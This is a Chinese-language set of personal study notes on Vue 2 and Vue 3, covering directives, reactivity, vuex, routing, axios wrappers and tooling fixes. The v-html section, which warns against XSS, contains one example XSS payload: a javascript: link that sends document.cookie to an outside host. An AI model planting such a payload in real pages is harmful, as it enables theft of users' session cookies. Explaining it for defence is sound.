# Vue学习笔记

## 1.模板语法

###   (1)插值

- ​      a.文本{{}}

- ​      b.纯HTML({{}}默认不会解析,怕标签内容是用户借助前端的输入框生产出来的，再从数据库中提出来可能出现渲染错误内容，绝对不要对用户提供的内容使用V-HTML，要后端的信任内容发过来才能用)

​          v-html,要防止XSS,CSRF(

​              前端过滤

​              后台转义（<>:&lt;&gt;）

​              给cookie加上属性http

​          )

​          <a href=javascript:location.href='http://baidu.com?cookie=' +document.cookie>click</a>

- ​      c.表达式

###   (2)指令：带有v-前缀的特殊属性，()里为缩写

1. ​      v-bind:(:)  动态绑定属性
2. ​      v-if/v-else-if/v-else 动态创建/删除
3. ​      v-show      动态显示/隐藏
4. ​      v-on:click(@) 事件绑定
5. ​      v-for       遍历（里面用in或者of都可，没区别）
6. ​      v-model     双向绑定表单
7. ​      v-slot(#)   插槽标签

## 2.vue2在初始定义之后添加的状态不会被拦截的解决方案：

​      【对象】：Vue.set(对象，属性，值)
​      【数组】：Vue2将数组的方法(splice,shift,pop,push等等)重写了，除了原有的功能外还增加了拦截

## 3.vue3支持动态增加属性的拦截-proxy

​      如果Vue3中使用new Vue，报错：Vue is not a constructor
​      因为Vue2是面向对象，有this，
​      Vue3中改变得写法有两个，其他几乎都没有改变
​      【1】Vue3用Vue.createApp().mount('#box')
​      【2】Vue3中数据对象改成了用data()函数return一个对象
​      【vue3支持动态增加属性的拦截】原理proxy

## 4.虚拟dom  

​	key：跟踪每个结点的身份，从而重用和重新排序现有元素

​	理想的key值是每项都有的且唯一的id。data.id

（为什么需要key，理想的key要item.id，唯一不重复，而且不能是索引值（如果从中间删了数据就不行啦））

​      【111，222，333】->虚拟dom（js对象描述的真实dom节点）->真实Dom

​      【111，333】->新虚拟dom->和老的虚拟dom对比->patch更新到真实Dom

  因为创建真实dom很不划算，一个dom节点有很多属性，而虚拟dom就是用js对象来描述一个节点

## 5.数组检测更新

  a使用以下会改变原始数组的方法会检测变动【其实是vue重新改写了这些方法】
      push,pop,shift,unshift,splice,sort,reverse
  b使用以下不会改变数组的方法就要重新赋值以下
      filter，concat，slice，map，要用新数组替换旧数组
  cVue2不能检测以下变动的数组,Vue3可以
      vm.items[indexOfItem]=newValue
      解决：
      （1）Vue.set(example1.items,indexOfItem,newValue)
      （2）splice

## 5.事件调用有三种写法

  事件调用时传递的函数可以加括号，也可以不加，
  1加括号：可以传参数，如果想传事件对象，第一个参数必须为$event
  2不加括号：不可以传参数，但是可以直接拿到event事件对象
  3直接写触发代码【只适合简单逻辑】
  （v-model就是event.target.value的语法糖）

## 6.1事件修饰符

  事件冒泡的问题
      原生：e.stopPropagation()//给加上禁止冒泡
      .stop阻止冒泡
      .self冒泡上来的事件自己不能被触发
      .capture添加事件侦听器时使用事件捕获模式,有此属性的先（按捕获顺序）执行
      .once只能点一次，后面点击就无效了
      .prevent阻止默认行为（更多用在表单里，不要点击就提交，可以在跳转之前先校验一下是否需要处理一下）【原生e.preventDefault】

## 6.2按键修饰符

​      @keyup.enter只有当你按下enter健时候才会触发，就不用判断e.keyCode===13(enter)再执行代码了
​      .esc .up .dowm .left .right .space .ctrl .shift .delete
​      常见都有（没有的话直接.+键值：比如a：@keyup.65就可以了）
​      而且还可以链式使用
​      比如：@keyup.enter.ctrl就是同时按下这两个键触发

## 6.3表单修饰符

​      .lazy只有失去焦点才获取，例如v-model.lazy="mytext"
​      .number所有表单都是输出字符串，包括number表单，那么.number可以直接将结果转为数字类型
​      .trim去首位空格

## 7.vue双向绑定,属于mvvc的特性,相对于mvc(model,view,controler)把controler改成了viewmodel层<br />

  react只能算view层,是一个库,算不上一个框架
  1多行文本框绑字符串
  2单行文本框绑字符串，
  3单个多选器绑布尔值、多个多选器绑数组
  4单选器绑字符串

## 8.计算属性和方法和watch的区别：

区别：计算属性就是为了一段复杂逻辑写在DOM中很麻烦，现在将他放到计算属性中来做，页面只管显示一个普通的状态就好了，而方法更本质用于事件处理器，方法是用来处理事件绑定等回调事件处理器。watch可以用来监听一个属性的变化，然后来处理相应逻辑，可以处理异步
  【方法】：事件绑定，逻辑计算，可以不用return，没有缓存，调用几次就执行几次
  【计算属性(重视结果)】：有缓存，基于依赖的缓存，调用多次只执行一次，必须有return，只求结果，有缓存，同步，不能处理异步，return等不了你
  【watch(重视过程)】:监听一个值的改变，不用返回值（因为没啥用），异步同步都可以

  【过滤器】比如图片需要更改一下url，因为函数推荐写事件，这里需要传参，也不适用于计算属性，
          Vue2中采用了过滤器，来更严格规范这几个的不同用处 

### watch注意：

1. immediate
    immediate的值默认是false,在第一次进入页面页面时,如果没有发生数据变化watch并不会立即监听只有发生数据改变,hander才会有操作,但是如果将immediate设置为true,在第一次进入页面时就会绑定值.
2. deep
   deep就是用来深度监听的,默认值为false.vue是不能检测到对象属性的添加或删除，我们使用watch监听一个对象时，除非是直接重新给对象赋值，否则是不能监听到对象里的值的变化的
3. handler就是watch中用来监听事件变化的当中有两个参数oldVal是用来看修改前的值是多少,newVal是用获取修改后的数值是多少.

```js
watch: {
    a: {
      handler(newVal, oldVal) {
        console.log(oldVal)
        console.log(newVal)
      },
      immediate: false, // 值为true或false，默认false
      deep: false // 值为true或false，默认false
 
    }
  },
```



## 9.报错原因

vue.next.js:1616 [Vue warn]: Maximum recursive updates exceeded. This means you have a reactive effect that is mutating its own dependencies and thus recursively triggering itself. Possible sources include component template, render function, updated hook or watcher source function.

答：是因为我将一个方法中更改了状态，又返回这个状态，就会一直循环触发更新,而放在计算属性中则不会。


9. ferch：是一个标准，就像XMLHttpRequest
       ajax:技术，局部更新页面，异步请求数据
       实现ajax请求的方法：XHR，后来XHR被fetch替代了，
       fetch兼容性不好，可用此库兼容，底层也是判断支不支持fetch，不行就XHR
       http://github.com/camsong/fetch-ie8
       注意：fetch请求默认不带cookie，需要设置fetch(url,{credentials: 'include'}

  axios不是一个标准，是一个第三方封装

## 10.组件相关（详见10-组件体验）

  动态组件 <component></component>vue内置的一个组件 -->
      不加:的话，is后面的会被认为是一个组件、 -->
      缺点：组件切换不会复用，会被彻底销毁,解决加入 <keep-alive></keep-alive>包裹，离开之后dom不会被销毁【keep-alive原理其实是把数据存在内存中，回来的时候再读回来】

slot插槽（内容分发）详见（11-slot插槽）

## 11.vue底层更新原理

  vue2中Object.definedproperty()的get，set拦截，vue3中porxy拦截，每次数据改变时，就会被观察者拦截到，通知所有跟这个状态相关的组件重新渲染，渲染到的时候会创建一份新的虚拟dom节点，本质上是对象，对比老的虚拟dom节点，新老虚拟dom对比时会用到diff算法，diff算法会保证最优的效率去对比，最小的代价去更新dom，1按照树的结构同层级对比，2如果在列表中会同key值对比，key相同就复用，key不同就删除老的创建新的对比，3同组件对比，如果没有key，4还会按标签进行对比，如果组件和标签不一样，就会重新删除，创建新的对比
  <!-- key值不能用index，不然的话总认为是最后一个删掉了 -->

## 12.过渡效果里面命名要注意（详见12-过渡效果）

  .fql-enter-active {
      animation: aaa 1.5s;
  }
  <transition name="fql" appear>
      <div v-show="isShow">2222222</div>
  </transition> 
  列表：<transition-group>会实例化为一个标签，通过tag标签指定
  appear是出现时也加动画
  mode属性out-in，in-out,如果出现滚动条，是因为动画用了translateX，加上overflow：hidden就可以

## 13.生命周期：四对八个

创建前before creat
创建后created

  挂载前before mount
  挂载后mounted

  更新前before update
  更新后updated

  销毁前before destroy
  销毁后destroyed

## 14.swiper在封装组件时候，

 new swiper应该在生命周期的mounted里面，因为不能重复new，所以不能在updated里面写，使用mounted之后还要加上key来启动diff算法，或者v-if，来控制组件的删除和创建，以便触发mounted来初始化swiper

模块化的swiper是可以按需导入的。具体查文档

## 15.vue2(类:this)

   vue3(类:90%一样)(hooks:函数式)

## 16.自定义指令

  为了操作底层dom
  实际应用:可以通过指令知道什么时候dom创建完成，从而进行依赖dom的库的初始化工作（例如swiper初始化）
  定义指令，指令可以获取底层dom节点

  *指令的生命周期函数:这两个可以简写成一个回调函数，两个都会执行
  1 inserted:第一次插入父节点才触发
  2 update:更新时触发（update没有d）

  vue2指令生命周期：
  bind，指令第一次绑定到元素时调用，可以进行初始化设置
  inserted，被绑定元素插入父节点时调用（仅保证父节点存在，不一定已被插入文档）
  update，所在组件的vnode更新时调用，可能发生在更新前
  componentUpdated，指令所在组件的vnode及其子vnode全部更新调用后
  unbind，只调用一次，指令与元素解绑时调用

  【注意】vue3中指令生命周期：（跟类组件生命周期就差了一个）
  一个指令定义对象可以提供如下几个钩子函数 (均为可选)：
  created：在绑定元素的 attribute 或事件监听器被应用之前调用。在指令需要附加在普通的 v-on事件监听器调用前的事件监听器中时，这很有用。
  beforeMount：当指令第一次绑定到元素并且在挂载父组件之前调用。
  mounted：在绑定元素的父组件被挂载后调用。
  beforeUpdate：在更新包含组件的 VNode 之前调用。
  updated：在包含组件的 VNode 及其子组件的 VNode 更新后调用。
  beforeUnmount：在卸载绑定元素的父组件之前调用
  unmounted：当指令与元素解除绑定且父组件已卸载时，只调用一次。

## 17.package.json中，为了记住所有安装的模块，通过脚本快速启动项目

"scripts": {
  <!-- npm run server启动项目【开发】 -->
  "serve": "vue-cli-service serve",
  <!-- npm run build编译项目【发布】-->
  "build": "vue-cli-service build",
  <!-- npm run lint【修复格式错误】 -->
  "lint": "vue-cli-service lint"
},

## 18.vue eslint格式化报错问题，弄了半天

  【1】 @vue/standard’不希望代码中有双引号的存在， .eslintrc.js 会把代码中的单引号(’ ')全部转换为双引号(" ") 也会在每一行后面添加分号(；)
  https://blog.csdn.net/mslmhl/article/details/105835747
  【2】 格式化插件自动的将缩进改为2
js-css-html formatter 保存时自动格式化代码缩进空格怎么从4个修改到2个？
1关掉jscssformat【反正都废弃了】
2vscode 编辑器中按F1/ctrl+shift+p; 搜索formatter config打开fromatter.json直接更改indent_size就可以了然后重启vscode;
  【3】npm run lint修复
  【4】插件eslint（成功率不太好用），文件-首选项-设置-用户-setting.json，加上以下配置：
  "editor.codeActionsOnSave":{
"source.fixAll":true
  }
  【5】【推荐】关闭eslint,最后开都不用开然后npm run lint一次；
新建vue.config.js配置文件，加上一句话：
module.exports = {
  lintOnSave: false// 暂时关闭代码格式检查
}
  （配置修改了要重启项目）
  【6】vue.config.js中配置publicPath:'./'

## 19.vue高亮是vutuer插件，如果要缩进记得settings配置：

  "[vue]": {
  "editor.defaultFormatter": "octref.vetur"
},

## 20.使用vue的一些小问题

1 组件导入进来的是一个曾经的大对象，导入之后还要全局或者局部注册
2 css会影响其他组件，只要加上scoped就好了，局部css,加上了会带上一个唯一的属性，按照属性选择
3 要访问的静态资源放在public中，但是路径不能从src中往外，index.html在public中，所以直接/文件名就好了
4 npm i --save 会放在package.json的"dependencies"，上线需要的依赖模块
  npm i --dev，开发阶段要依赖的模块

## 21. JSONP(JSON with Padding)


是JSON的一种“使用模式”，可用于解决主流浏览器的跨域数据访问的问题。由于同源策略，一般来说位于 server1.example.com 的网页无法与不是 server1.example.com的服务器沟通，而 HTML 的<script> 元素是一个例外。利用 <script> 元素的这个开放策略，网页可以得到从其他来源动态产生的 JSON 资料，而这种使用模式就是所谓的 JSONP。用 JSONP 抓到的资料并不是 JSON，而是任意的JavaScript，用 JavaScript 直译器执行而不是用 JSON 解析器解析。

【只能发get请求】

## 22. 配置反向代理：

原理：配置自己的服务器，来转发我的请求，服务器之间没有跨域限制，只有浏览器有跨域限制：在vue.config.js文件配置：配完重启
// 配置反向代理
devServer: {
  proxy: {
'/ajax': {
  target: 'https://i.maoyan.com',
  changeOrigin: true
}
  }
}
如果有两个ajax开头的要代理到不同服务器，可以使用不同的开头，然后再正则匹配删掉，比如：
devServer: {
  proxy: {
'/ajax': {
  target: 'https://i.maoyan.com',
  changeOrigin: true
},
'/fql': {
  target: 'https://i.maoyan.com',
  changeOrigin: true,
  pathRewrite:{
    '^/fql':''
  }
}
  }
}

## 23. alias别名，模块化导入时可以使用@/component/Navbar

  @就是一个指向src的绝对路径
  webpack配置的别名,vue.config.js文件配置：配完重启
  configureWebpack: {
  resolve: {
    alias: {
      assets: '@/assets',
      views: '@/views'
    }
  }
}

## 24. 声明式导航的【问题】

  1 同源下可以这么写，但是实现不了点击了保持高亮
  <a href="/#/center">center</a>
  <a href="/#/films">films</a>
  <a href="/#/cinemas">cinemas</a>
  2 vue中声明式导航：
写法一：手动写li，里面渲染出来的a标签

```html
<li>
  <router-link to="/films" active-class="fql-active">电影</router-link>
</li>
<li>
  <router-link to="/cinemas" active-class="fql-active">影院</router-link>
</li>
<li>
  <router-link to="/center" active-class="fql-active">我的</router-link>
</li> 
```

写法二：tag写法，渲染成tag指定的标签vue router3，【会报警告】

```html
 <router-link to="/films" active-class="fql-active">电影</router-link>
  <router-link to="/cinemas" active-class="fql-active">影院</router-link>
  <router-link to="/center" active-class="fql-active">我的</router-link>
```

  可以添加active-class="fql-active",来设置css保持高亮,vue router4之前支持tag写法，渲染成tag指定的标签,否则就要自己加li标签
写法三：vue4中：
replace

```html
<router-link to="/about" tag="span" event="dblclick">About Us</router-link>
```

with（插槽写法，可以随意指定渲染出的是什么标签）

```html
<router-link to="/about" custom v-slot="{ navigate }">
  <span @click="navigate" @keypress.enter="navigate" role="link">About Us</span>
</router-link>
```



## 25. 编程式导航this.$router.push('/films')

  原生中声明式a标签，vue中router-link
  原生中函数式location.href标签，vue中this.$router.push('/films')

## 26. 开发列表渲染流程：

请求列表数据->渲染->点击跳转详情(动态路由)->获取id->通过id请求详情数据

## 27. 路由懒加载


单页面应用中路由懒加载可以解决首页白屏事件过长，分散到每一个页面去,实现参照路由官网

## 28. 路由原理(BOM提供)

（1）hash路由：

​		切换：location.hash

​		监听路径的切换：window.onhashchange

（2）history路由：

​		切换：history.pushState

​		监听路径的切换：window.onpopstate

## 29. rem回顾

fontSize计算：

 以设计稿750px为例，自适应屏幕尺寸,设置根字体大小为：其中100是基准，是为了rem好算来设置的

```javascript
document.documentElement.style.fontSize = (document.documentElement.clientWidth / 750) * 100 + 'px'
```

注意：更改根元素字体大小后记得将body的字体大小改回来。

然后量多少px就写多少，转换成rem就好了,如上设置100的话，rem=量出来的px/100，插件px to rem，装好后在setting.json文件中设置基准

```json
"cssrem.rootFontSize":100
```

## 30. 当出现eslint的规则不符合实际情况时

我们可以在.eslintrc.js文件中修改配置，例如no-new错误（不能随便么new不赋值）

```js
  rules: {
    'no-console': process.env.NODE_ENV === 'production' ? 'warn' : 'off',
    'no-debugger': process.env.NODE_ENV === 'production' ? 'warn' : 'off',
    // 关闭组件命名规则检查
    'vue/multi-word-component-names': 'off',
    //关闭no-new检查
    'no-new': 'off'
  }
```

## 31. 静态资源位置及导入

当将静态资源放在src/assets文件夹下时，我们需要使用模块化引入方式，如果放在public文件夹下，则使用标签导入

## 32. 测试接口工具postman



## 33. 通过axios请求数据，显示http://localhost:8081/项目名/[object%20Object] 404 (Not Found) 错误。

在csdn搜索发现需要删除第一行的.get才可以

```javascript
axios.get({

   url: 'https://m.maizuo.com/gateway?cityId=440300&pageNum=1&pageSize=10&type=1&k=4381834',

   headers: {

​    'X-Client-Info':

​     '{"a":"3000","ch":"1002","v":"5.2.0","e":"16478277145010066465882113"}',

​    'X-Host': 'mall.film-ticket.film.list'

   }

  })
```

## 34. 跨域

1 jsonp，后端设置jsonp接口

2 如果后端设置了响应头Access-Control-Allow-Origin: *，那么就允许跨域

3 如果不允许跨域，可以配置反向代理

## 35. css一行显示

```css
设置inline-block属性
强制不换行
隐藏超出部分
显示“……”

 display: inline-block;
 white-space: nowrap; 
 overflow: hidden;
 text-overflow:ellipsis;
```

## 36. 封装axios请求

插曲：header居然大写了，导致跨域问题，研究了半天

```javascript
// 1 对于数据请求的封装,把所有axios请求放到一个文件中，导出调用
import axios from 'axios'
function httpForNowplayingList() {
 return axios({
  url: 'https://m.maizuo.com/gateway?cityId=440300&pageNum=1&pageSize=10&type=1&k=4381834',
  headers: {
   'X-Client-Info':
​    '{"a":"3000","ch":"1002","v":"5.2.0","e":"16478277145010066465882113"}',
   'X-Host': 'mall.film-ticket.film.list'
  }
 })
}
function httpForDetail(params) {
 return axios({
  url: `https://m.maizuo.com/gateway?filmId=${params}&k=681100`,
  headers: {
   'X-Client-Info':
​    ' {"a":"3000","ch":"1002","v":"5.2.0","e":"16478277145010066465882113","bc":"310100"}',
   'X-Host': 'mall.film-ticket.film.info'
  }
 })
}
export default { httpForDetail, httpForNowplayingList }
```

```javascript
// 2 axios-github 创建新实例，把重复部分封装起来,可以像axios本身那样用，只是可以简写部分
import axios from 'axios'
const http = axios.create({
  baseURL: 'https://m.maizuo.com',
  timeout: 1000,
  headers: {
    'X-Client-Info':
      ' {"a":"3000","ch":"1002","v":"5.2.0","e":"16478277145010066465882113","bc":"310100"}'
  }
})
// 发请求之前拦截：loading框
// 发请求之后拦截：loading框
export default http
```

## 37.日期格式化库moment.js



## 38. 同时使用同一个swiper组件时，会导致new多次相互影响

需要给这几个不同的swiper实例传一个字符串name来区分，使用此字符串new Swiper时动态new

```js
 new Swiper('.' + this.name, {
      // loop: true
      slidesPerView: this.perView,
      spaceBetween: 20,
      freeMode: true
    })
```

  注意：可搭配v-if或者:key="newList.length来使用"（diff算法），因为第一次数据没取回来之前也会初始化一次

## 40. 指令最佳实践

在设置顶部框时,若滚动到某一位置就固定在屏幕某个位置，可以直接使用css粘性定位来设置

```css
.film-header{
    position: sticky;
    top: 0px;
    background: white;
}
```

如果一开始不显示，滚动到某一位置才开始显示，可以使用vue自定义指令，由于代码有比较多的底层操作，所以封装成指令来操作，而且可以复用，传参

```css
//首先在dom中写好，且固定在屏幕最上方，当滚动到某一位置就显示，
.header {
  position: fixed;
  top: 0;
  width: 100%;
  height: 2.4444rem;
  line-height: 2.4444rem;
  text-align: center;
  z-index: 999;
  background-color: white;
}
```

```js
//然后控制显示隐藏
Vue.directive('scroll', {
  inserted (el, binding) {
    // console.log(el)
      //el拿到的是这个被绑定的dom本身
    el.style.display = 'none'
    window.onscroll = () => {
      // 初始化时不显示
      if (
        (document.documentElement.scrollTop || document.body.scrollTop) >
        binding.value
      ) {
        el.style.display = 'block'
      } else {
        el.style.display = 'none'
      }
    }
  },
  unbind () {
    // 指令周期。销毁时解除绑定
    window.onscroll = null
  }
})
```

## 41. betterScroll小问题

1 防止初始化过早，需要在this.$nextTick()中写，上树之后初始化

 2 在betterScroll中，加上了滚动条之后会依据屏幕来滚，我们需要的是按照父盒子来滚动，解决方案：加固定定位

```css
.wrapper {
  height: 16.6667rem;
  overflow: hidden;
  position: relative;//修正滚动条位置
}
```

3 垂直高度由于rem是基于width来设置的，所以不好做适配，需要使用动态计算高度,行内动态css高度属性

（1）通过ref拿到组件再通过$el拿到元素，需要传参，不方便

```js
this.$refs.tabbar.$el.offsetHeight
```

（2）直接找dom元素

```js
 this.height = document.documentElement.clientHeight -document.querySelector('.footer').offsetHeight + 'px'
```

## 42. Vant组件

List组件在懒加载时，如果设置了总长度匹配

```js
 // 总长度匹配。禁用
      if (this.filmList.length === this.total) {
        this.finished = true
        return
      }
```

bug:如果第二个页面出现了滚动条，再返回第一个页面，会立即触发：this.finished = true

是因为初始化的两个值都是0，要加上如下非0判断

```js
 // 总长度匹配。禁用
      if (this.filmList.length === this.total && this.total !== 0) {
        this.finished = true
        return
      }
```

## 43. vuex

传统的多页面方案：

1. location.href = '#cinemas?cityname=' + city.name

2. cookie,localStorage

单页面方案：

1. 中间人模式
2. bus事件总线$on,$emit

3. **vuex**: 状态共享管理方案

## 44. 为什么需要**vuex**

1. 非父子通信
2. 后端数据的缓存快照，减少重复的数据请求，减轻服务器压力，提高用户体验

## 45. vuex同步

组件中提交到mutation，mutation修改状态，修改后页面中相关的组件会重新渲染

为什么提交到mutation中？

1. 为了状态好管理，统一提交，统一管理，

2. 还可以被devtools实时监控，可以做时光旅行来检查状态

## 46. vuex异步

mutation中不支持异步，不能发axios请求，只支持同步，因为devtools必须监控他的一个状态和结果，如果异步了是检测不到的。

所以需要异步，使用Action：

Action  类似于 mutation，不同在于：

- Action 提交的是 mutation，而不是直接变更状态。改变状态只有一种方式，就是提交mutation
- Action 可以包含任意异步操作。

**同步问题**：如果两个页面设置为同步，例如（点开搜索栏）第二个页面需要第一个页面同步数据，这样的话如果我先进入搜索页面就会出问题，需要异步！

**解决：请求这几个页面中的任意一个页面时都把这几个页面的数据（同一个接口）请求回来，缓存下来，另几个页面就用缓存的数据，大大提高用户体验。**

使用缓存时需要判断状态是否有数据，如果有，就不发送请求

```javascript
mounted() { 
// 分发action去axios请求数据
    // 判断下长度是否为0，以便减少发请求次数，使用缓存
    if (this.$store.state.cinemaList === 0) {
      this.$store.dispatch("getcinemaData");
    }
}
```

但是会有这样一个问题，如果需要nextTick这种等数据回来之后，数据上树之后才能做的事情，比如初始化betterScroll，可以使用在**action中返回一个Promise**，等数据请求完成之后在开始nextTick

```js
mounted() {
// 分发
    // 判断下长度是否为0，以便减少发请求次数
    if (this.$store.state.cinemaList.length === 0) {
       // 由于action中返回了promise，因此使用then
      this.$store.dispatch("getcinemaData").then(() => {
        //console.log("数据请求回来了");
        this.$nextTick(() => {
          BScroll.use(ScrollBar);
          new BScroll(".wrapper", {
            scrollY: true,
            scrollbar: true,
          });
        });
      });
    } else {
      //console.log("直接使用缓存");
      this.$nextTick(() => {
        BScroll.use(ScrollBar);
        new BScroll(".wrapper", {
          scrollY: true,
          scrollbar: true,
        });
      });
    }
}
```

```javascript
//actions:
actions: {
    //传store+载荷
    getcinemaData(store) {
      console.log("getdata");
      // return一个promise，等待他落定之后，就可以在后面去new BetterScroll
      return http({
        url: `/gateway?cityId=${store.state.cityId}&ticketFlag=1&k=4828317`,
        headers: { "X-Host": "mall.film-ticket.cinema.list" },
      }).then((res) => {
        store.commit("changeCinemaList", res.data.data.cinemas);
        console.log(res.data.data.cinemas);
        console.log(store);
      });
    },
  },
```



## 47. 模糊查询

```js
//过滤名字和地址中有对应值的
computedList() {
      return this.$store.state.cinemaList.filter(
        (item) =>
          item.name.toUpperCase().includes(this.value.toUpperCase()) ||
          item.address.toUpperCase().includes(this.value.toUpperCase())
      );
    },
```

## 48.vuex新写法-映射

1. mapState 辅助函数是一个返回一个计算属性，所以在计算属性中写：
2. mapMutations、mapActions辅助函数是一个返回一个方法，所以在方法中写：

首先要导入：

```js
import { mapState,mapMutations,mapActions } from 'vuex'
```



## 49. vuex持久化：vuex-persistedstate

vuex默认是管理在内存中，一刷新页面，公共状态就丢了

可以使用库：https://github.com/robinvdvleuten/vuex-persistedstate，控制保存在localStorage or sessionStorage

```js
//可选保存哪些值以持久化
plugins: [
    createPersistedState({
      reducer: (state) => {
        return {
          cityId: state.cityId,
          cityName: state.cityName,
        };
      },
    }),
  ],
```



## 50. mixin混入

如果多个组件中要用到一些共同的方法、生命周期里要执行同样的函数，可以使用混入，将其抽离出来，需要使用时导入。

相比于...展开操作符，它可以深度混入，即将共同键的对象混合在一起，而...在遇到两个相同的比如两个methods就会有问题。

```js
mixins: [mixinObj],
```

还可以使用路由拦截，使用路由的meta属性，来执行一些多组件都要执行的东西。

## 51. vue3改变

1. 底层属性拦截proxy
2. 初始化createApp，creatStore，creatRouter

2. vue3中依赖的router是4.0版本，而vue2依赖的是3.2版本，使用的时候可查看文档，基本没有太大变化。重定向有变化

3. 指令生命周期的名字换成了跟组件生命周期差不多的
4. 组件生命周期的destroyed改成了unmounted，beforeUnmount
5. 过滤器不让用了，用函数调用
6. 中央事件总线bus没有了
7. 依赖注入模式
8. 最大的改变hooks，叫做**composition Api**（没有this）
9. vue3的生命周期有两种写法，旧的和setup这一种，"setup,等价于beforeCreate，created生命周期"

```js
import { reactive } from "@vue/reactivity";
export default {
// vue3的生命周期有两种写法，旧的和setup这一种
  setup() {
    console.log("setup,等价于beforeCreate，created生命周期");
    // 定义状态,不要忘记引入reactive
    const obj = reactive({
      myname: "fql",
      myage: 100,
    });
    const handleClick = () => {
      console.log("handleclick");
      obj.myname = "wq";
    };
    return { obj, handleClick };
  },
}
```

两套东西可以混写但是会出现访问不到的时候，所以只能单独使用一种，不要一块用

## 52. reactive

1 reactive类似useState,**如果是字符串，数字会报警告，value cannot be made reactive，不能拦截到**，所以应该设置对象，这样可以数据驱动页面，建议直接把所有状态写在同一个对象中，页面也相对清爽

2 vue3中template可以放多个根节点（兄弟节点）

## 53. ref

一、绑定到标签上还是可以拿到标签实例dom以及获取value值

先导入

```js
import { reactive, ref } from "@vue/reactivity";
 setup() {

    const myref = ref();
  //通过.value拿到的是标签对象，再次.value拿到的是值
    const handleRef = () => {
      console.log(myref.value.value);
    };
    return { obj, handleClick, myref, handleRef };
  },
};

```

二、状态使用

引入ref后可以使用如下方式当状态导出**一个字符串，可以拦截到，但是拦截的是.value值**，js中要使用stateRef.value才能拿到和修改值

```js
const stateRef = ref("fql");//实际上是对.value属性进行拦截
```

在模板中可以直接写stateRef来使用，但是在js中必须写stateRef.value

## 54. reactive和ref可以转换

reactive在导出时转换一下，就可以在dom中少写obj.xxx,而直接使用状态名，直接展开obj的话拦截不到

torefs可以把reactive里的每个属性转换成ref对象，展开后就变成多个ref对象，依然具有响应式

```js
return{
	...toRefs(obj)//转换出来的是一个对象，所以要展开
}
```

## 55. vue3父子通信

基本上等同于之前的，只是没有this了区别

父传子通过属性。孩子在setup中通过props.xxx获取

子传父通过父亲传一个自定义事件绑定事件方法，孩子通过setup的第二个参数来得到emit方法，一般可以通过{emit}将其结构出来。

## 56. vue3生命周期

vue2那一套

**vue3第一套**给选项式API用的：只是将vue2那一套的beforeDestroyed和destroyed改成了beforeUnmmounted,unmounted

**vue3第二套**给组合式API用的：将第一套的beforeCreate，created删除了，可用setup代替，其他的在第一套的名字前面加上on就好了

```js
export default {
  setup() {
    // mounted
    onMounted(() => {
      console.log('Component is mounted!')//dom上树，可在此进行axiso请求，事件监听，setInterval
    })
  }
}
```

## 57.计算属性和watch

也跟之前差不多，

computed() 只不过是变成了一个函数，传一个回调。【注重结果】

watch()  传**两个回调函数**，第一个回调是绑定监听哪一个状态（要写成回调），第二个回调则是需要执行的相关逻辑怕【注重过程逻辑】

## 58. vue3-自定义hooks

逻辑太长可以抽取出来，但是在类写法的时候，抽走了this就不明确会指向哪里，函数式就不会有这个担忧。

将**视图写在.vue文件中，将js逻辑抽出来写在另一个js文件**，将方法export出来，在vue文件中调用，大大减少了vue文件的代码量。

## 59. router,route,store新写法

```js
import {useRouter,useRoute} from 'vue-router'
import {useStore} from 'vuex'
const router=useRouter()//此时router就相当于之前的this.$router()
const route=useRoute()
const store=useStore()
```

## 60. Provide / Inject

父组件向子组件传递数据时，我们使用 [props](https://v3.cn.vuejs.org/guide/component-props.html)。想象一下这样的结构：有一些深度嵌套的组件，而深层的子组件只需要父组件的部分内容。在这种情况下，如果仍然将 prop 沿着组件链逐级传递下去，可能会很麻烦。

对于这种情况，我们可以使用一对 `provide` 和 `inject`。无论**组件层次结构有多深，父组件都可以作为其所有子组件的依赖提供者**。这个特性有两个部分：父组件有一个 `provide` 选项来提供数据，子组件有一个 `inject` 选项来开始使用这些数据。

```js
import {provide} from "vue"
setUp(){
    const isshow=ref(true)
    provide("fqlshow",isShow)
}
```

```js
import {inject} from "vue"
setUp(){
    const isshow=inject("fqlshow")
	isShow.value=false//因为前面用的ref
}
```

有时我们需要在注入数据的组件内部更新 inject 的数据。在这种情况下，我们建议 provide 一个方法来负责改变响应式 property。

如果要确保通过 `provide` 传递的数据不会被 inject 的组件更改，我们建议对提供者的 property 使用 `readonly`。

详见文档。
